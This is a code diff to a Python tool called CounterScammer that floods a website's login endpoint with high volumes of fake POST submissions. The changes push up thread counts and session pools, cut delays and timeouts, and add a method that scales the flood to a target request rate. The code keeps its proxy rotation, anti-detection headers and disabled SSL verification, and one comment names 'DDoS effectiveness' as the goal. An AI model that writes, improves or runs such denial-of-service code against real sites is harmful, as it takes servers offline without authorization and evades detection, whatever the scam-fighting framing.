@@ -34,9 +34,14 @@ class CounterScammer:
         # Initialize custom user agent
         self.user_agent_list = CustomUserAgent.get_user_agents()
         
+        # Performance optimization settings (define before session pool)
+        self.max_concurrent_requests = 500  # Will be adjusted dynamically during attacks
+        self.connection_timeout = 2  # Reduced from 5 to 2 seconds
+        self.read_timeout = 3  # Reduced from 10 to 3 seconds
+        
         # Session pool for connection reuse and better performance
         self.session_pool = []
-        self.max_sessions = 20
+        self.max_sessions = 100  # Increased from 20 to 100
         self._init_session_pool()
         
         # Advanced headers with anti-detection
@@ -63,10 +68,10 @@ class CounterScammer:
         self.proxy_list = self._load_proxy_list() if stealth_mode else []
         self.current_proxy_index = 0
         
-        # Rate limiting and timing randomization
-        self.min_delay = 0.001
-        self.max_delay = 0.005
-        self.request_variance = 0.002
+        # Rate limiting and timing randomization (optimized for performance)
+        self.min_delay = 0.0001    # Reduced from 0.001
+        self.max_delay = 0.001     # Reduced from 0.005
+        self.request_variance = 0.0005  # Reduced from 0.002
         
         # Login types and their corresponding form data templates
         self.login_types = {
@@ -114,16 +119,20 @@ class CounterScammer:
         for _ in range(self.max_sessions):
             session = requests.Session()
             session.verify = False  # Ignore SSL verification for stealth
-            session.timeout = (5, 10)  # Connection and read timeout
+            session.timeout = (self.connection_timeout, self.read_timeout)  # Use optimized timeouts
             
-            # Configure session for better performance
+            # Configure session for maximum performance
             adapter = requests.adapters.HTTPAdapter(
-                pool_connections=10,
-                pool_maxsize=20,
-                max_retries=0
+                pool_connections=50,  # Increased from 10
+                pool_maxsize=100,     # Increased from 20
+                max_retries=0,        # No retries for speed
+                pool_block=False      # Don't block when pool is full
             )
             session.mount('http://', adapter)
             session.mount('https://', adapter)
+            
+            # Disable keep-alive warnings
+            session.headers.update({'Connection': 'close'})
             
             self.session_pool.append(session)
     
@@ -242,7 +251,7 @@ class CounterScammer:
         # Construct full URL
         full_url = f"{self.base_url}{self.endpoint}"
         
-        # Add timing variance for stealth
+        # Add timing variance for stealth (but reduce for performance)
         if self.stealth_mode:
             self._add_timing_variance()
         
@@ -252,13 +261,13 @@ class CounterScammer:
             self.stats['bytes_sent'] += request_size
             self.stats['total_requests'] += 1
             
-            # Send POST request with all evasion techniques
+            # Send POST request with optimized settings for speed
             response = session.post(
                 url=full_url,
                 data=data_to_send,
                 headers=headers_to_use,
                 proxies=proxies,
-                timeout=(3, 7),  # (connection, read) timeout for DDoS effectiveness
+                timeout=(self.connection_timeout, self.read_timeout),  # Use optimized timeouts
                 allow_redirects=False,  # Don't follow redirects for speed
                 stream=False,  # Don't stream for speed
                 verify=False  # Ignore SSL for stealth
@@ -482,6 +491,9 @@ class CounterScammer:
         Returns:
             Dict: Attack statistics and results
         """
+        # Optimize system for target RPS
+        self.optimize_for_rps(rps)
+        
         self.stats['start_time'] = time.time()
         total_requests = rps * duration
         
@@ -518,9 +530,9 @@ class CounterScammer:
                     form_data = request_info['form_data']
                     request_start_time = time.time()
                     
-                    # Add some randomization to avoid pattern detection
+                    # Add minimal randomization to avoid pattern detection (reduced for performance)
                     if self.stealth_mode:
-                        delay = random.uniform(0, 0.1)  # Random micro-delay
+                        delay = random.uniform(0, 0.01)  # Reduced from 0.1 to 0.01 seconds
                         time.sleep(delay)
                     
                     response = self.send_request(form_data)
@@ -548,7 +560,8 @@ class CounterScammer:
                     }
             
             # Use ThreadPoolExecutor for maximum concurrency
-            max_workers = min(100, len(batch_requests) * 2)  # Aggressive threading
+            # Dynamic thread pool sizing based on target RPS
+            max_workers = min(500, len(batch_requests) * 3)  # Much more aggressive threading
             with ThreadPoolExecutor(max_workers=max_workers) as executor:
                 future_to_request = {
                     executor.submit(send_single_request, req, i): (i, req)
@@ -956,7 +969,50 @@ class CounterScammer:
             'recommendation': recommendation,
             'can_handle_target': rps_accuracy >= 75
         }
-
+    
+    def optimize_for_rps(self, target_rps: int):
+        """
+        Optimize system settings based on target RPS.
+        
+        Args:
+            target_rps (int): Target requests per second
+        """
+        # Adjust concurrent requests based on target RPS
+        self.max_concurrent_requests = min(1000, target_rps * 2)
+        
+        # Adjust session pool size
+        optimal_sessions = min(200, max(50, target_rps // 5))
+        if len(self.session_pool) < optimal_sessions:
+            # Add more sessions if needed
+            for _ in range(optimal_sessions - len(self.session_pool)):
+                session = requests.Session()
+                session.verify = False
+                session.timeout = (self.connection_timeout, self.read_timeout)
+                
+                adapter = requests.adapters.HTTPAdapter(
+                    pool_connections=50,
+                    pool_maxsize=100,
+                    max_retries=0,
+                    pool_block=False
+                )
+                session.mount('http://', adapter)
+                session.mount('https://', adapter)
+                session.headers.update({'Connection': 'close'})
+                
+                self.session_pool.append(session)
+        
+        # Adjust timing for high RPS
+        if target_rps > 100:
+            self.min_delay = 0.0001
+            self.max_delay = 0.001
+            self.request_variance = 0.0001
+        
+        print(f"🔧 System optimized for {target_rps} RPS:")
+        print(f"   📊 Session pool: {len(self.session_pool)} sessions")
+        print(f"   ⚡ Max concurrent: {self.max_concurrent_requests}")
+        print(f"   ⏱️  Timeouts: {self.connection_timeout}s/{self.read_timeout}s")
+        print(f"   🎯 Timing variance: {self.request_variance}s")
+        
 
 # Example usage and testing functions
 def test_single_request():
